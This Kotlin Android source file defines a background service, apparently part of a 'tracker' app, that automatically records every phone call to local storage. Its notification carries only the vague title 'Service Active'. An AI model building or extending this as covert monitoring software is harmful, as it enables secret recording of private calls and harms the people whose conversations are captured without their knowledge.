package com.abuzahra.tracker.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.abuzahra.tracker.LocalStorageManager
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * CallRecorderService - خدمة تسجيل المكالمات
 * الإصدار الجديد: يحفظ التسجيلات محلياً فقط - بدون Firebase
 */
class CallRecorderService : Service() {
    private var recorder: MediaRecorder? = null
    private var outputFile: String? = null
    private var isRecording = false
    private val CHANNEL_ID = "call_rec_channel"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(2, createNotification())
        listenToCallState()
    }

    private fun listenToCallState() {
        try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            tm.listen(object : android.telephony.PhoneStateListener() {
                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    when (state) {
                        TelephonyManager.CALL_STATE_OFFHOOK -> if (!isRecording) startRecording()
                        TelephonyManager.CALL_STATE_IDLE -> if (isRecording) stopRecording()
                    }
                }
            }, android.telephony.PhoneStateListener.LISTEN_CALL_STATE)
        } catch (e: Exception) {
            Log.e("CallRecorder", "خطأ في مراقبة المكالمات: ${e.message}")
        }
    }

    private fun startRecording() {
        try {
            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            outputFile = File(cacheDir, "CALL_$timeStamp.3gp").absolutePath

            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(outputFile)
                prepare()
                start()
            }
            isRecording = true
            Log.d("CallRecorder", "تم بدء التسجيل")
        } catch (e: Exception) {
            Log.e("CallRecorder", "فشل بدء التسجيل: ${e.message}")
        }
    }

    private fun stopRecording() {
        try {
            recorder?.apply { stop(); release() }
            recorder = null
            isRecording = false

            // حفظ معلومات التسجيل محلياً
            outputFile?.let { path ->
                val file = File(path)
                val callData = mapOf(
                    "type" to "call_recording",
                    "file_name" to file.name,
                    "file_path" to file.absolutePath,
                    "file_size" to file.length(),
                    "timestamp" to System.currentTimeMillis()
                )
                LocalStorageManager.storeData(this, "call_recording", callData)
                Log.d("CallRecorder", "تم حفظ التسجيل: ${file.name}")
            }
        } catch (e: Exception) {
            Log.e("CallRecorder", "فشل إيقاف التسجيل: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Call Recorder", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("Service Active")
        .setSmallIcon(android.R.drawable.ic_btn_speak_now)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null
}
